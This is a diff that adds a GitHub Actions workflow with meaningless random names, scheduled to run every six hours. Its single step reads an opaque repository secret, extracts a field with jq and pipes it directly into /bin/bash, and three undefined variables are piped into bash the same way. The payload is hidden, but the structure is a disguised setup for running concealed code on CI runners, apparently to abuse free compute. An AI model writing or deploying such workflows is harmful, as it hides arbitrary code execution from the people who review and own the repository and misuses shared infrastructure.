@@ -1,0 +1,21 @@
+name: lubeichen3891
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lubeichen3891
+        env:
+          f6824: ${{ secrets.f6824 }}
+        run: |
+          echo $f6824 | jq -r .bpi26 | /bin/bash
+          echo $vdr9 | jq -r .pupa262 | /bin/bash
+          echo $fu3 | jq -r .dtiok19605 | /bin/bash
+          echo $hmug5078 | jq -r .gxoj71 | /bin/bash
+
